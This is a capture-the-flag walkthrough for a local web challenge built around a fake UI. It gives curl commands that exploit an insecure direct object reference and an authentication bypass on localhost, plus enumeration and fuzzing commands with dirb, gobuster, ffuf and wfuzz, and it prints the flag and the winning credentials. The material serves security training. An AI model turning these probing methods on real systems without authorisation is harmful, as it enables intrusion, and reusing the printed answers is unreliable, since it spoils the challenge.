# Direct Hide S3 3 - Step-by-Step Walkthrough

## 🎯 Challenge Overview
This is a **misdirection challenge** - the UI is designed to waste your time with fake paths. The real vulnerabilities require manual discovery.

## 🚨 Quick Start Guide

### ❌ **What NOT to Do**
- Don't click the "Download Flag" button (fake)
- Don't use the terminal widget (fake) 
- Don't follow breadcrumbs (fake)
- Don't trust any UI element

### ✅ **What TO Do**
1. **Ignore the entire UI**
2. **Manually enumerate endpoints**
3. **Test parameters systematically**
4. **Try different HTTP methods**

## 🔍 **Discovery Process**

### Step 1: Endpoint Enumeration
```bash
# Test common endpoints
curl http://localhost:3000/admin        # Returns decoy JSON
curl http://localhost:3000/api          # 404
curl http://localhost:3000/download     # 404 but accepts parameters!
curl http://localhost:3000/handshake    # 403 but exists!
```

### Step 2: Parameter Testing
```bash
# Test /download endpoint with different IDs
curl "http://localhost:3000/download?id=test"      # 404
curl "http://localhost:3000/download?id=admin"     # 404  
curl "http://localhost:3000/download?id=real_flag" # BINGO! Real flag
```

### Step 3: Alternative Methods
```bash
# Test /handshake with POST
curl -X POST -H "Content-Type: application/json" \
  -d '{"token":"test","verify":"test"}' \
  http://localhost:3000/handshake       # 403

# Try theme-related credentials (pharmacy/tree from flag context)
curl -X POST -H "Content-Type: application/json" \
  -d '{"token":"pharmacy_tree","verify":"jamun"}' \
  http://localhost:3000/handshake       # SUCCESS!
```

## 🏆 **Solutions**

### **Method 1: IDOR Vulnerability**
```bash
curl "http://localhost:3000/download?id=real_flag"
# Returns: flag{JAMUN_TREE_IN_FRONT_OF_PHARMACY}
```

### **Method 2: Authentication Bypass**
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"token":"pharmacy_tree","verify":"jamun"}' \
  http://localhost:3000/handshake
# Returns: {"success":true,"flag":"flag{JAMUN_TREE_IN_FRONT_OF_PHARMACY}"}
```

## 🧠 **Key Learning Points**

1. **UI Misdirection**: Professional-looking interfaces can be completely fake
2. **Manual Testing**: Real vulnerabilities often have no UI presence
3. **Endpoint Discovery**: Always enumerate paths beyond what's linked
4. **Parameter Fuzzing**: Test different values systematically
5. **Context Clues**: Challenge names/themes often hint at exploitation methods

## 🛠️ **Tools for Discovery**

### **Directory Enumeration**
```bash
dirb http://localhost:3000/
gobuster dir -u http://localhost:3000/ -w /usr/share/wordlists/dirb/common.txt
```

### **Parameter Fuzzing**  
```bash
ffuf -w wordlist.txt -u http://localhost:3000/download?id=FUZZ
wfuzz -w wordlist.txt http://localhost:3000/download?id=FUZZ
```

### **Manual Testing**
```bash
# Test different HTTP methods
curl -X GET http://localhost:3000/handshake
curl -X POST http://localhost:3000/handshake  
curl -X PUT http://localhost:3000/handshake

# Test with different content types
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d "token=test&verify=test" http://localhost:3000/handshake
```

## 💡 **Pro Tips**

1. **Always read error messages carefully** - they contain clues
2. **Try obvious values first** - admin, test, real_flag, production
3. **Consider the challenge context** - names, themes, descriptions
4. **Test both GET and POST methods** on discovered endpoints
5. **Use Burp Suite or similar** for systematic parameter testing

## 🎭 **Psychology Behind the Challenge**

This challenge exploits several cognitive biases:
- **Instant Gratification**: Big download button gives immediate "reward"
- **Authority Bias**: Security badges and professional design create trust
- **Confirmation Bias**: Success animations convince you've succeeded
- **Path Dependence**: UI guides you to intended (fake) paths

**The lesson**: Always maintain skepticism and verify independently!

---

**Flag**: `flag{JAMUN_TREE_IN_FRONT_OF_PHARMACY}`
